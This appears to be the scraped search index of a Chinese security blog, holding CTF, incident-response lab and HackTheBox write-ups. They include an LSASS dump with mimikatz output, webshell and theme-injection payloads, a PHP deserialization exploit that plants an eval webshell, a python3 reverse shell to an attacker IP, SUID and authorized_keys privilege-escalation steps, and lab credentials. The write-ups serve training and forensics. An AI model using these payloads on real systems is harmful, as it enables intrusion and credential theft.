\"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026rundll32.exe comsvcs.dll, MiniDump 852 C:\\Temp\\OnlineShopBackup.zip full\u0026echo [S]\u0026cd\u0026echo [E] cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026net localgroup administrators admin /add\u0026echo [S]\u0026cd\u0026echo [E] 1、管理员Admin账号的密码是什么？ cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026net user admin Password1 /add\u0026echo [S]\u0026cd\u0026echo [E] 根据上面流量，得到是Password1 flag{Password1} 2、LSASS.exe的程序进程ID是多少？ 解密流量得到 cd /d \"C:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\onlineshop\"\u0026rundll32.exe comsvcs.dll, MiniDump 852 C:\\Temp\\OnlineShopBackup.zip full\u0026echo [S]\u0026cd\u0026echo [E] https://zhuanlan.zhihu.com/p/346022067 其中 rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump pid lsass.dmp full\" flag{852} 3、用户WIN101的密码是什么? 下载上面得到的lsass进程 在这里进行了文件读取的操作，将回显下载下来 选择原始数据进行导出 删除前面多余的字符便是正常的 dmp 文件 利用mimikatz进行解密 sekurlsa::minidump lsass.dmp sekurlsa::logonpasswords SID : S-1-5-21-3374851086-947483859-3378876003-1103 msv : [00000003] Primary * Username : win101 * Domain : VULNTARGET * NTLM : 282d975e35846022476068ab5a3d72df * SHA1 : bc9ecca8d006d8152bd51db558221a0540c9d604 * DPAPI : 8d6103509e746ac0ed9641f7c21d7cf7 tspkg : wdigest : * Username : win101 * Domain : VULNTARGET * Password : (null) kerberos : * Username : win101 * Domain : VULNTARGET.COM * Password : (null) ssp : credman : cloudap : Authentication Id : 0 ; 995 (00000000:000003e3) Session : Service from 0 User Name : IUSR Domain : NT AUTHORITY Logon Server : (null) Logon Time : 2023/10/19 11:26:36 SID : S-1-5-17 解密一下NTLM 得到密码 flag{admin#123} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%82%E8%9A%81%E7%88%B1%E4%B8%8A%E6%A0%91/:2:0","tags":["流量分析"],"title":"第六章-流量特征分析-蚂蚁爱上树","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%82%E8%9A%81%E7%88%B1%E4%B8%8A%E6%A0%91/"},{"categories":["应急响应"],"content":"1.木马的连接密码是多少 2.黑客执行的第一个命令是什么 3.黑客读取了哪个文件的内容，提交文件绝对路径 4.黑客上传了什么文件到服务器，提交文件名 5.黑客上传的文件内容是什么 6.黑客下载了哪个文件，提交文件绝对路径 ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:0:0","tags":["流量分析"],"title":"第六章-流量特征分析-蚁剑流量分析","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":" 0x00 环境Antsword.pcap ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:1:0","tags":["流量分析"],"title":"第六章-流量特征分析-蚁剑流量分析","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":" 0x01利用CTF-NETA进行分析 1.木马的连接密码是多少 flag{1} 2.黑客执行的第一个命令是什么 第一个返回的是www-data，所以猜测是id flag{id} 3.黑客读取了哪个文件的内容，提交文件绝对路径 返回了/etc/passwd的内容，所以应该是/etc/passwd flag{/etc/passwd} 4.黑客上传了什么文件到服务器，提交文件名 5.黑客上传的文件内容是什么 解密一下流量 * \u003c?php @ini_set(\"display_errors\", \"0\"); @set_time_limit(0); $opdir = @ini_get(\"open_basedir\"); if ($opdir) { $ocwd = dirname($_SERVER[\"SCRIPT_FILENAME\"]); $oparr = preg_split(base64_decode(\"Lzt8Oi8=\"), $opdir);@ array_push($oparr, $ocwd, sys_get_temp_dir()); foreach($oparr as $item) { if (!@is_writable($item)) { continue; }; $tmdir = $item. \"/.368479785\";@ mkdir($tmdir); if (!@file_exists($tmdir)) { continue; } $tmdir = realpath($tmdir);@ chdir($tmdir);@ ini_set(\"open_basedir\", \"..\"); $cntarr = @preg_split(\"/\\\\\\\\|\\//\", $tmdir); for ($i = 0; $i \u003c sizeof($cntarr); $i++) {@ chdir(\"..\"); };@ ini_set(\"open_basedir\", \"/\");@ rmdir($tmdir); break; }; };; function asenc($out) { return $out; }; function asoutput() { $output = ob_get_contents(); ob_end_clean(); echo \"6960\". \"cb205\"; echo@ asenc($output); echo \"1e0a\". \"91914\"; } ob_start(); try { $f = base64_decode(substr($_POST[\"t41ffbc5fb0c04\"], 2)); $c = $_POST[\"ld807e7193493d\"]; $c = str_replace(\"\\r\", \"\", $c); $c = str_replace(\"\\n\", \"\", $c); $buf = \"\"; for($i=0;$i\u003cstrlen($c);$i+=2) $buf.=urldecode(\"%\".substr($c,$i,2)); echo(@fwrite(fopen($f,\"a\"),$buf)?\"1\":\"0\");;} catch(Exception $e){ echo \"ERROR://\".$e-\u003egetMessage(); }; asoutput(); die(); ?\u003e 解密一下文件名 \u003c?php $f = base64_decode(substr(\"0ZL3Zhci93d3cvaHRtbC9mbGFnLnR4dA==\", 2)); $c = \"666C61677B77726974655F666C61677D0A\"; $c = str_replace(\"\\r\", \"\", $c); $c = str_replace(\"\\n\", \"\", $c); $buf = \"\"; for($i=0;$i\u003cstrlen($c);$i+=2) $buf.=urldecode(\"%\".substr($c,$i,2)); echo(@fwrite(fopen($f,\"a\"),$buf)?\"1\":\"0\"); ?\u003e 在/var/www/html下写入了flag.txt文件，并且内容为flag{write_flag} 6.黑客下载了哪个文件，提交文件绝对路径 wireshark中的流量解密 可以看到是一个下载文件的请求，将2eL3Zhci93d3cvaHRtbC9jb25maWcucGhw进行解密得到 flag{/var/www/html/config.php} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/:2:0","tags":["流量分析"],"title":"第六章-流量特征分析-蚁剑流量分析","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"categories":["应急响应"],"content":" 0x00环境分析 1.黑客成功登录系统的密码 flag{xxxxxxxxxxxxxxx} 2.黑客发现的关键字符串 flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx} 3.黑客找到的数据库密码 flag{xxxxxxxxxxxxxxxx} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-waf-%E4%B8%8A%E7%9A%84%E6%88%AA%E8%8E%B7%E7%9A%84%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/:1:0","tags":["流量分析"],"title":"第六章-流量特征分析-Waf上的截获的黑客攻击流量","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-waf-%E4%B8%8A%E7%9A%84%E6%88%AA%E8%8E%B7%E7%9A%84%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/"},{"categories":["应急响应"],"content":" 0x011、黑客成功登录系统的密码 直接过滤http请求，找到登陆请求，进行过滤 _ws.col.info == \"POST /admin/login.php?rec=login HTTP/1.1 (application/x-www-form-urlencoded)\" || http.response.code == 302 flag{admin!@#pass123} 2、黑客发现的关键字符串 /images/article/a.php是webshell 所以关键字符串大概率在服务器中，黑客可以通过webshell看到 http.request.uri==\"/images/article/a.php\" || http.response.code==200 flag{87b7cb79481f317bde90c116cf36084b} 3.黑客找到的数据库密码 在webshell流量中找到了操作数据库的流量 \u003c?php $conf = $m ? stripslashes($_POST[\"z1\"]) : $_POST[\"z1\"]; $ar = explode(\"choraheiheihei\", $conf); $dbn = $m ? stripslashes($_POST[\"z2\"]) : $_POST[\"z2\"]; $sql = base64_decode($_POST[\"z3\"]); var_dump(\"host:\".$ar[0],\"username:\".$ar[1],\"password:\".$ar[2]); ?\u003e 得到密码 flag{e667jUPvJjXHvEUv} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-waf-%E4%B8%8A%E7%9A%84%E6%88%AA%E8%8E%B7%E7%9A%84%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/:2:0","tags":["流量分析"],"title":"第六章-流量特征分析-Waf上的截获的黑客攻击流量","uri":"/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%88%86%E6%9E%90-waf-%E4%B8%8A%E7%9A%84%E6%88%AA%E8%8E%B7%E7%9A%84%E9%BB%91%E5%AE%A2%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F/"},{"categories":["应急响应"],"content":" 0x00 环境分析 服务器场景操作系统 Linux 服务器账号密码 root xjty110pora 端口 2222 ","date":"2024-06-05","objectID":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/:1:0","tags":["Linux"],"title":"第五章-Linux实战-黑链","uri":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/"},{"categories":["应急响应"],"content":" 0x011、找到黑链添加在哪个文件 flag 格式 flag{xxx.xxx} 备份源码 tar -zcvf /tmp/web.tar.gz /var/www/html 搜索一下黑链 在header.php中 flag{header.php} 2、webshell的绝对路径 flag{xxxx/xxx/xxx/xxx/} 放到 D 盾里扫描一下或者全局搜索一下eval 发现在404.php中 flag{/var/www/html/usr/themes/default/404.php} 3、黑客注入黑链文件的 md5 md5sum file flag{md5} 在poc1.js中发现了注入黑链的文件 // 定义一个函数，在网页末尾插入一个iframe元素 function insertIframe() { // 获取当前页面路径 var urlWithoutDomain = window.location.pathname; // 判断页面是否为评论管理页面 var hasManageComments = urlWithoutDomain.includes(\"manage-comments.php\"); var tSrc=''; if (hasManageComments){ // 如果是，则将路径修改为用于修改主题文件的页面地址 tSrc=urlWithoutDomain.replace('manage-comments.php','theme-editor.php?theme=default\u0026file=404.php'); }else{ // 如果不是，则直接使用主题文件修改页面地址 tSrc='/admin/theme-editor.php?theme=default\u0026file=404.php'; } // 定义iframe元素的属性，包括id、src、width、height和onload事件 var iframeAttributes = \"\u003ciframe id='theme_id' src='\"+tSrc+\"' width='0%' height='0%' onload='writeShell()'\u003e\u003c/iframe\u003e\"; // 获取网页原始内容 var originalContent = document.body.innerHTML; // 在网页末尾添加iframe元素 document.body.innerHTML = (originalContent + iframeAttributes); } // 定义一个全局变量isSaved，初始值为false var isSaved = false; // 定义一个函数，在iframe中写入一段PHP代码并保存 function writeShell() { // 如果isSaved为false if (!isSaved) { // 获取iframe内的内容区域和“保存文件”按钮元素 var content = document.getElementById('theme_id').contentWindow.document.getElementById('content'); var btns = document.getElementById('theme_id').contentWindow.document.getElementsByTagName('button'); // 获取模板文件原始内容 var oldData = content.value; // 在原始内容前加入一段phpinfo代码 content.value = ('\u003c?php @eval($_POST[a]); ?\u003e\\n') + oldData; // 点击“保存文件”按钮 btns[1].click(); // 将isSaved设为true，表示已经完成写入操作 isSaved = true; } } // 调用insertIframe函数，向网页中添加iframe元素和写入PHP代码的事件 insertIframe(); flag{10c18029294fdec7b6ddab76d9367c14} 4、攻击入口是哪里？url请求路径，最后面加/ flag{/xxxx.xxx/xxxx/x/} 在源码中存在output.pcag，利用wireshark分析一下 通过源码得知是Typecho，百度搜索得知存在RCE漏洞 https://blog.mo60.cn/index.php/archives/Typecho-1-2-xss2rce.html 通过流量包查看，正是此漏洞 触发点是/index.php/archives/1/ flag{/index.php/archives/1/} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/:2:0","tags":["Linux"],"title":"第五章-Linux实战-黑链","uri":"/%E7%AC%AC%E4%BA%94%E7%AB%A0-linux%E5%AE%9E%E6%88%98-%E9%BB%91%E9%93%BE/"},{"categories":["应急响应"],"content":" 0x00 环境分析 rdp 端口 3389 administrator xj@123456 phpstudy ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-wordpress/:1:0","tags":["windows"],"title":"第四章-Windows实战-Wordpress","uri":"/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-wordpress/"},{"categories":["应急响应"],"content":" 0x011、请提交攻击者攻击成功的第一时间 日志存储位置C:\\phpstudy_pro\\Extensions\\Nginx1.15.11\\logs\\access.log 黑客一直在爆破后台，从最后一个POST登陆请求之后，访问/manage/welcome.php就返回200了 所以时间是29/Apr/2023:22:45:23 flag{2023:04:29 22:45:23} 2、请提交攻击者的浏览器版本 flag{Firefox/110.0} 3、请提交攻击者目录扫描所使用的工具名称 在日志中，发现扫描器特征 flag{Fuzz Faster U Fool} 4、找到攻击者写入的恶意后门文件，提交文件名 使用D盾扫描一下 flag{C:\\phpstudy_pro\\WWW\\.x.php} 5、找到攻击者隐藏在正常web应用代码中的恶意代码，提交该文件名 同上，已经在D盾中显示出来 flag{C:\\phpstudy_pro\\WWW\\usr\\themes\\default\\post.php} 6、请指出可疑进程采用的自动启动的方式，启动的脚本的名字 查看自启动文件目录 C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp C:\\Users\\Administrator\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup 并无可疑文件，接下来查看Temp目录和Windows目录 在Windows目录下，发现可疑文件 x.bat启动了360.exe 将360.exe上传微步看看，发现是木马 flag{x.bat} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-wordpress/:2:0","tags":["windows"],"title":"第四章-Windows实战-Wordpress","uri":"/%E7%AC%AC%E5%9B%9B%E7%AB%A0-windows%E5%AE%9E%E6%88%98-wordpress/"},{"categories":["应急响应"],"content":" 0x00 环境分析 ssh root@env.xj.edisec.net -p xjqxwcyc 1.黑客隐藏的隐藏的文件 完整路径md5 2.黑客隐藏的文件反弹shell的ip+端口 {ip:port} 3.黑客提权所用的命令 完整路径的md5 flag{md5} 4.黑客尝试注入恶意代码的工具完整路径md5 5.使用命令运行 ./x.xx 执行该文件 将查询的 Exec****** 值 作为flag提交 flag{/xxx/xxx/xxx} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/:1:0","tags":["Linux权限维持"],"title":"第三章-权限维持-Linux权限维持隐藏","uri":"/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/"},{"categories":["应急响应"],"content":" 0x011.黑客隐藏的隐藏的文件 完整路径md5 find / -name \".*\"，在tmp下面发现隐藏路径 在1.py中实现了一个持久化的反向shell 并且在c文件中实现了对1.py的隐藏 flag{109ccb5768c70638e24fb46ee7957e37} 2.黑客隐藏的文件反弹shell的ip+端口 {ip:port} 提交1.py中的ip和port 3.黑客提权所用的命令 完整路径的md5 flag{md5} 使用了最常规的suid提权 find / -perm -u=s -type f 2\u003e/dev/null find命令可直接进行提权 flag{7fd5884f493f4aaf96abee286ee04120} 4.黑客尝试注入恶意代码的工具完整路径md5 在/opt目录下，发现恶意工具 cymothoa是一款黑客工具 flag{087c267368ece4fcf422ff733b51aed9} 5.使用命令运行 ./x.xx 执行该文件 将查询的 Exec****** 值 作为flag提交 flag{/xxx/xxx/xxx} 使用python3运行一下/tmp/.temp/libprocesshider/1.py 成功运行 which查找一下python3 flag{/usr/bin/python3.4} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/:2:0","tags":["Linux权限维持"],"title":"第三章-权限维持-Linux权限维持隐藏","uri":"/%E7%AC%AC%E4%B8%89%E7%AB%A0-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E9%9A%90%E8%97%8F/"},{"categories":["应急响应"],"content":" 0x00 靶机信息 服务器场景操作系统 Linux 服务器账号密码 root xjredis ","date":"2024-06-05","objectID":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:1:0","tags":["redis"],"title":"第二章-日志分析-Redis应急响应","uri":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["应急响应"],"content":" 0x011、通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交; 查看日志 在/var/log下存在redis.log文件 192.168.100.20进行了主从复制加载了exp.so文件 2、通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交; 通过上面得到了恶意文件名exp.so，利用find进行查找， find / -name \"exp.so\"，查找到在根目录下载下来 flag{XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b} 3、通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交; crontab -l查看定时任务 4、通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag{黑客的用户-关键字符串} 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交 find / -name \"authorized_keys\" 在ssh里面发现用户 xj-test-user 到github上面搜索一下这个用户 在里面发现了redis-rogue-getshell工具 看一下历史版本，发现关键字 flag{xj-test-user-wow-you-find-flag} 5、通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交; 命令替换，查看一下/usr/bin ls -al /usr/bin 发现了ps和ps_，直接打开查看一下 flag{c195i2923381905517d818e313792d196} ","date":"2024-06-05","objectID":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/:2:0","tags":["redis"],"title":"第二章-日志分析-Redis应急响应","uri":"/%E7%AC%AC%E4%BA%8C%E7%AB%A0%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90-redis%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"categories":["HackTheBox"],"content":" sudo nmap --min-rate 10000 -A -sS 10.129.210.162 Host is up (0.15s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA) | 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA) |_ 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Apache2 Ubuntu Default Page: It works Device type: firewall Running (JUST GUESSING): Fortinet embedded (94%) OS CPE: cpe:/h:fortinet:fortigate_100d Aggressive OS guesses: Fortinet FortiGate 100D firewall (94%), Fortinet FortiGate-50B or 310B firewall (89%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 367.08 ms 10.10.16.1 2 367.04 ms 10.129.210.162 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 119.63 seconds 80端口存在一个Apache默认页面 利用dirsearch扫描，扫描到一个wordpress目录 将域名添加到host 10.129.210.162 tenet.htb 通过网站文章得知 存在sator.php.bak文件 \u003c?php class DatabaseExport { public $user_file = 'users.txt'; public $data = ''; public function update_db() { echo '[+] Grabbing users from text file \u003cbr\u003e'; $this-\u003e data = 'Success'; } public function __destruct() { file_put_contents(__DIR__ . '/' . $this -\u003euser_file, $this-\u003edata); echo '[] Database updated \u003cbr\u003e'; // echo 'Gotta get this working properly...'; } } $input = $_GET['arepo'] ?? ''; $databaseupdate = unserialize($input); $app = new DatabaseExport; $app -\u003e update_db(); ?\u003e 很明显存在反序列化漏洞 构造poc \u003c?php class DatabaseExport { public $user_file = 'users.txt'; public $data = ''; public function __construct(){ $this-\u003euser_file=\"shell.php\"; $this-\u003edata=\"\u003c?php eval(\\$_REQUEST[1]);?\u003e\"; } } $o = new DatabaseExport(); echo urlencode(serialize($o)); ?\u003e 访问shell.php 利用python3反弹shell ?1=system('export RHOST=\"10.10.16.6\";export RPORT=1234;python3 -c \\'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/bash\")\\''); 收集数据库账号和密码 define( 'DB_NAME', 'wordpress' ); /** MySQL database username */ define( 'DB_USER', 'neil' ); /** MySQL database password */ define( 'DB_PASSWORD', 'Opera2112' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); /** Database Charset to use in creating database tables. */ define( 'DB_CHARSET', 'utf8mb4' ); 通过/etc/passwd得知存在neil账户，利用密码复用 成功登陆 打开user.txt sudo -l查看一下权限 Matching Defaults entries for neil on tenet: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\: User neil may run the following commands on tenet: (ALL : ALL) NOPASSWD: /usr/local/bin/enableSSH.sh 可以root权限运行/usr/local/bin/enableSSH.sh文件 文件的大概代码逻辑就是向tmp目录中写入公钥文件名为tmp-xxx接着在写入到/root/.ssh/authorized_keys中， 这里利用条件竞争写入，先本地生成密钥后写入 while true do echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDBi/2i5Ihf1Lov/drxsMhcW6JC3+I1kYSyBwFLfjxjZU+g31osMQA9OD6FqLbCZY02jNCdrp2lZScRHGIjzLixG+zu5mUdQ4HIEuZ9xU8alaVtgPYocBSgLaB/A/+7B9Tws/30aEw8PXa0Dpiku0j7q84Rx2oIAV41WSZjmEaIhs01Wmai3kDnFzrjiZFA1gaq0TH+QzR0EYllYKbPqQScSQc2WPPlawcp+EHIEMooH+3EAPO9BDcORxMRM8nCfEFXKYPMeSXsb7nfCr1C/ERKTQ85DK0pY9C+URS8jjntti8BInStiBi24mSNHo2HEhPkHc0zGBga5VPiiRXRggZGISjx5rvn3182RujljlJX/lRIKLpKzcpFqXavDChCXfBaEz1qBAMSimfaMTrijzLKTW62x4KsvhZo0BgWowJxjXA1kI/mmOuYrmI3Gglh40M/hexcvLQjvPQvoCYtdqKSRgOwti8XdYHz/gnpEIjDBAW2bH3hUNZPcfag9AZIiek= root@ubuntu'|tee /tmp/ssh-* done 接着运行/usr/local/bin/enableSSH.sh文件 ssh root@10.129.210.162 -p 22 -i id_rsa 成功登陆 ","date":"2024-04-16","objectID":"/hackthebox-tenet/:0:0","tags":["内网渗透 Linux"],"title":"HackTheBox-Tenet","uri":"/hackthebox-tenet/"},{"categories":["HackTheBox"],"content":" sudo nmap --min-rate 10000 -A -sS 10.129.248.82 Host is up (0.14s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn't have a title (text/html). 3306/tcp open mysql MySQL (unauthorized) No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94%E=4%D=4/15%OT=22%CT=1%CU=31117%PV=Y%DS=2%DC=T%G=Y%TM=661CEC3 OS:A%P=x86_64-apple-darwin21.6.0)SEQ(SP=100%GCD=1%ISR=10E%TI=Z%CI=Z%TS=A)SE OS:Q(SP=100%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=100%GCD=2%ISR=10E%TI=Z OS:%CI=Z%II=I%TS=A)SEQ(SP=101%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53A OS:ST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST11NW7%O6= OS:M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF= OS:Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q OS:=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y% OS:T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD OS:=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL OS:=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S) Network Distance: 2 hops TRACEROUTE (using port 21/tcp) HOP RTT ADDRESS 1 109.26 ms 10.10.16.1 2 150.71 ms 10.129.248.82 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 54.99 seconds 存在80 22 3306端口 访问80端口，点击链接发现均跳转到了spectra.htb域名，在/etc/hosts添加 利用dirsearch目录爆破，/testing/存在目录遍历 wp-config.php.save存在数据库泄漏 define( 'DB_NAME', 'dev' ); /** MySQL database username */ define( 'DB_USER', 'devtest' ); /** MySQL database password */ define( 'DB_PASSWORD', 'devteam01' ); /** MySQL hostname */ define( 'DB_HOST', 'localhost' ); /** Database Charset to use in creating database tables. */ define( 'DB_CHARSET', 'utf8' ); /** The Database Collate type. Don't change this if in doubt. */ define( 'DB_COLLATE', '' ); 直接登陆3306，但是并不能连接，这里密码复用登陆后台 用户名在首页处得到administrator 进入后台后得知WordPress 5.4.2版本 利用msf进行getshell exploit/unix/webapp/wp_admin_shell_upload /opt/autologin.conf.orig文件 # Copyright 2016 The Chromium OS Authors. All rights reserved. # Use of this source code is governed by a BSD-style license that can be # found in the LICENSE file. description \"Automatic login at boot\" author \"chromium-os-dev@chromium.org\" # After boot-complete starts, the login prompt is visible and is accepting # input. start on started boot-complete script passwd= # Read password from file. The file may optionally end with a newline. for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do if [ -e \"${dir}/passwd\" ]; then passwd=\"$(cat \"${dir}/passwd\")\" break fi done if [ -z \"${passwd}\" ]; then exit 0 fi # Inject keys into the login prompt. # # For this to work, you must have already created an account on the device. # Otherwise, no login prompt appears at boot and the injected keys do the # wrong thing. /usr/local/sbin/inject-keys.py -s \"${passwd}\" -k enter end script 利用chatgpt分析一下 这个脚本是用于在启动时自动登录的。下面是对脚本的解释： 1. 脚本的目的是在系统启动完成后自动登录。 2. 它会在启动完全完成后开始运行，也就是在 \"boot-complete\" 服务启动后。 3. 脚本首先会尝试从两个可能的目录中读取密码文件：\"/mnt/stateful_partition/etc/autologin\" 和 \"/etc/autologin\"。如果找到密码文件，则会读取其中的密码。 4. 